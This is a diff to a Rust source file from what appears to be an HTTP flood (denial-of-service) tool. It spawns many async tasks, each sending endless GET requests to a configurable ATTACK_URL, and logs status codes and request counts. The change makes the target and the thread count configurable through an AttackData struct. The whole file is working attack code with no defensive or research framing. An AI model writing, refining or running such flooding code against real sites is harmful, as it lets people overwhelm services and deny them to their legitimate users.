@@ -4,20 +4,21 @@ use std::thread;
 use reqwest::Response;
 use tokio::time::Instant;
 
-use crate::ram_manger::{AMOUNT, PUB_VAR, THREADS_ON};
+use crate::ram_manger::{AMOUNT, ATTACK_URL, PUB_VAR, THREADS_ON};
+use crate::where_attack::AttackData;
 
-pub async fn start() {
+pub async fn start(passed_var: AttackData) {
     loop {
-        core_attack();
+        core_attack(&passed_var);
     }
 }
 
-fn core_attack() {
+fn core_attack(passed_var: &AttackData) {
     let error_threads = PUB_VAR.lock();
     match error_threads {
         Err(_) => {}
         Ok(mut threads) => {
-            if threads.thread_on + 1 < crate::FORCE {
+            if threads.thread_on + 1 < passed_var.threads {
                 threads.thread_on += 1;
                 unsafe {
                     THREADS_ON += 1;
@@ -26,24 +27,26 @@ fn core_attack() {
                 tokio::spawn(async {
                     loop {
                         let now = Instant::now();
-                        let error_data = request(crate::ATTACK_URL);
-                        match error_data.await {
-                            Ok(status_code) => unsafe {
-                                AMOUNT += 1;
-                                println!(
-                                    "Threads on {}, Status code {}, Time Passed for request {} sec, Request per 10 Millisecond {}",
-                                    THREADS_ON,
-                                    status_code.status(),
-                                    now.elapsed().as_secs(),
-                                    AMOUNT,
-                                );
-                            }
-                            Err(data) => unsafe {
-                                println!(
-                                    "Status ERROR {} Request per 10 Millisecond {}",
-                                    data,
-                                    AMOUNT
-                                );
+                        unsafe {
+                            let error_data = request(&ATTACK_URL);
+                            match error_data.await {
+                                Ok(status_code) => {
+                                    AMOUNT += 1;
+                                    println!(
+                                        "Threads on {}, Status code {}, Time Passed for request {} sec, Request per 10 Millisecond {}",
+                                        THREADS_ON,
+                                        status_code.status(),
+                                        now.elapsed().as_secs(),
+                                        AMOUNT,
+                                    );
+                                }
+                                Err(data) => {
+                                    println!(
+                                        "Status ERROR {} Request per 10 Millisecond {}",
+                                        data,
+                                        AMOUNT
+                                    );
+                                }
                             }
                         }
                     }
@@ -65,6 +68,6 @@ fn time_function() {
     }
 }
 
-async fn request(url: &str) -> Result<Response, reqwest::Error> {
+async fn request(url: &String) -> Result<Response, reqwest::Error> {
     reqwest::Client::new().get(url).send().await
 }
